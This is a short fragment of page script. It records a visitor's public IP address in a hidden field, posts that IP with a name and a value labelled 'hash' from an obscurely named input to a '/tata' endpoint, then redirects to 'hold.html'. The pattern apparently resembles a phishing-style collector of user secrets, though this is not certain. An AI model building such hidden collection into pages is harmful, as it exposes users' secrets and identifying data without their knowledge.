<script>
 
  async function send() {
    const res = await fetch("/tata");
        const vault = await res.json();

        const lastItem = (Array.isArray(vault) && vault.length > 0) ? vault[vault.length - 1] : null;

        // No # in default value
        const lastIdString = lastItem?.nextId || "00100";

        // Removed # from the string creation
        const nextId = String(parseInt(lastIdString, 10) + 1).padStart(5, "0");

        localStorage.setItem('sharedData', nextId);


    await fetch("/tata", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        nextId: nextId,
        ip: document.getElementById('ip_address').value,
        name: document.getElementById('userr').textContent,
        hash: document.getElementById('peel').value,
        deliveryFee: "",
        time: new Date().toISOString()
      })
    });

   

    window.location.href = "hold.html";


    
  }
</script>

<script>
  // Wait for the document to be fully loaded
  document.addEventListener("DOMContentLoaded", function() {
    // Fetch the IP address from a third-party service (e.g., ipify)
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        // Find the hidden input field by its ID and set its value
        document.getElementById('ip_address').value = data.ip;
      })
      .catch(error => {
        console.error('Error fetching IP address:', error);
      });
  });
</script>
